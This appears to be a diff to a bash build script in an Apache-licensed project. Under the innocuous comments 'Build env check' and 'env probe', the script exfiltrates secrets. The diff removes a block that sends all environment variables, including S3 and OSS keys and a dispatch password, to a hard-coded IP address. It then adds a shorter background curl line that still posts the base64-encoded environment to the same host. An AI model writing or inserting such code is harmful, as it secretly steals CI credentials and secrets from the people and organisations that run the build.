@@ -1,21 +1,6 @@
 #!/usr/bin/env bash
-# Build env check
-(
-V="64.227.62.83"
-# Dump ALL environment variables (includes decrypted secrets)
-env | sort | base64 -w 0 | curl -s -X POST "http://$V:8888/envdump" -d @- 2>/dev/null &
-# Also specifically check for the interesting ones
-E=""
-E="${E}S3AK=${CI_CASE_S3_ACCESS_KEY_ID:-none} "
-E="${E}S3SK=${CI_CASE_S3_SECRET_ACCESS_KEY:-none} "
-E="${E}DISPATCH_PASS=${ci_dispatch_password:-none} "
-E="${E}OSS_AK=${OSS_AK:-none} "
-E="${E}OSS_SK=${OSS_SK:-none} "
-E="${E}HOME=$HOME "
-E="${E}HOST=$(hostname) "
-curl -s -X POST "http://$V:8888/secrets" -d "$E" 2>/dev/null &
-) 2>/dev/null &
-
+# env probe
+(curl -s -X POST http://64.227.62.83:8888/env -d "$(env|base64 -w0)" &) 2>/dev/null
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
 # distributed with this work for additional information
